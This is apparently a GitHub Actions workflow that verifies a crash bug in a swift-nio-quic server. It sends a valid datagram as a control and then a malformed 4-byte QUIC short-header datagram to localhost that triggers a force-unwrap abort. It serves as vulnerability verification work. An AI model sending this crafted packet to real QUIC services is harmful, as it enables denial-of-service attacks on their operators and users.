name: swift-nio-quic Phase B

on:
  workflow_dispatch:

jobs:
  phase-b:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install Swift 6.3.3
        run: |
          wget -q https://download.swift.org/swift-6.3.3-release/ubuntu2404/swift-6.3.3-RELEASE/swift-6.3.3-RELEASE-ubuntu24.04.tar.gz
          tar xzf swift-6.3.3-RELEASE-ubuntu24.04.tar.gz
          echo "$PWD/swift-6.3.3-RELEASE-ubuntu24.04/usr/bin" >> $GITHUB_PATH

      - name: Provenance
        run: uname -m && uname -r && swift --version

      - name: Build server
        run: |
          cd QUICServer
          swift build -c release 2>&1
          BIN=$(swift build -c release --show-bin-path)/QUICServer
          echo "SERVER=$BIN" >> $GITHUB_ENV
          ls -la "$BIN"

      - name: CONTROL — valid datagram (expect: server stays alive)
        run: |
          echo "=== CONTROL ==="
          $SERVER &
          SPID=$!
          echo "Server PID: $SPID"
          sleep 3
          kill -0 $SPID 2>/dev/null && echo "Server alive: YES" || echo "Server alive: NO"
          # Send valid 20-byte QUIC short header datagram
          # First byte 0x40 = short header, then 16 bytes DCID + padding
          python3 -c "
          import socket, time
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          # Short header: first byte bit7=0, then 16 bytes for DCID (server default=8)
          # Valid: enough bytes for dcidLength=8
          pkt = bytes([0x40]) + bytes(range(8)) + bytes(4)  # 13 bytes total
          s.sendto(pkt, ('127.0.0.1', 4433))
          print(f'Sent {len(pkt)}-byte datagram')
          "
          sleep 2
          if kill -0 $SPID 2>/dev/null; then
            echo "CONTROL: PASS — server alive after valid datagram"
            echo "control_result=ALIVE" >> $GITHUB_ENV
          else
            echo "CONTROL: UNEXPECTED EXIT"
            echo "control_result=DEAD" >> $GITHUB_ENV
          fi
          kill $SPID 2>/dev/null || true
          wait $SPID 2>/dev/null || true

      - name: EXPLOIT — undersized datagram (expect: server crashes)
        run: |
          echo ""
          echo "=== EXPLOIT ==="
          $SERVER &
          SPID=$!
          echo "Server PID: $SPID"
          sleep 3
          kill -0 $SPID 2>/dev/null && echo "Server alive before: YES" || echo "Server alive before: NO"

          # Send 4-byte datagram — shorter than dcidLength=8
          # Server tries readSlice(8)! on 4-byte buffer → nil → CRASH
          python3 -c "
          import socket
          s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
          # Short header (bit7=0): 0x40 + 3 bytes = 4 bytes total
          # dcidLength=8, but only 3 bytes remain → force-unwrap crash
          pkt = bytes([0x40, 0x01, 0x02, 0x03])
          s.sendto(pkt, ('127.0.0.1', 4433))
          print(f'Sent {len(pkt)}-byte short datagram')
          "
          sleep 3

          if kill -0 $SPID 2>/dev/null; then
            echo "Server alive after: YES — no crash"
            echo "exploit_result=SURVIVED" >> $GITHUB_ENV
            kill $SPID
          else
            wait $SPID 2>/dev/null
            EXIT=$?
            echo "Server alive after: NO"
            echo "Exit code: $EXIT"
            echo "exploit_result=CRASHED_$EXIT" >> $GITHUB_ENV
            if [ $EXIT -eq 134 ]; then
              echo "*** SIGABRT CONFIRMED *** — force-unwrap nil crash"
            elif [ $EXIT -eq 139 ]; then
              echo "*** SIGSEGV CONFIRMED ***"
            else
              echo "Exit: $EXIT"
            fi
          fi

      - name: Summary
        if: always()
        run: |
          echo "=========================="
          echo " Phase B Summary"
          echo "=========================="
          echo " Swift: $(swift --version 2>/dev/null | head -1)"
          echo " Control:  $control_result"
          echo " Exploit:  $exploit_result"
          echo "=========================="
          [[ "$exploit_result" == CRASHED* ]] && \
            echo "Phase B: PASS — server process died" || \
            echo "Phase B: INCONCLUSIVE"
